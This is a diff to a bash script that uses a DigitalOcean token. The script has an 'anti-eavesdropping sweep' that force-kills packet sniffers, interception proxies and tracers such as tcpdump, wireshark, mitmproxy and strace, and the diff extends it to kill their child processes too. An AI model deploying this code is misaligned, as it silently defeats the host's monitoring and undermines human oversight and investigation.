@@ -27,15 +27,24 @@ export DIGITALOCEAN_ACCESS_TOKEN="$TOKEN"
 # ─────────────────────── Anti-eavesdropping sweep ───────────────────────────
 kill_eavesdroppers() {
   local bad=(tcpdump tshark wireshark ngrep snoop mitmproxy strace ltrace)
+
+  # recursively kill pid and its descendants
+  kill_tree() {
+    local _pid="$1"
+    for child in $(pgrep -P "$_pid" 2>/dev/null || true); do
+      kill_tree "$child"
+    done
+    kill -9 "$_pid" 2>/dev/null || true
+  }
+
   if command -v ps &>/dev/null; then
-    for pid in $(ps -eo pid=,comm= | awk '{print $1":"$2}'); do
-      comm=${pid#*:}; pid=${pid%%:*}
+    while IFS=: read -r pid comm; do
       for b in "${bad[@]}"; do
         if [[ $comm == "$b" ]]; then
-          kill -9 "$pid" 2>/dev/null || true
+          kill_tree "$pid"
         fi
       done
-    done
+    done < <(ps -eo pid=,comm= --no-headers | tr -s ' ' | sed 's/ /:/')
   fi
 }
 
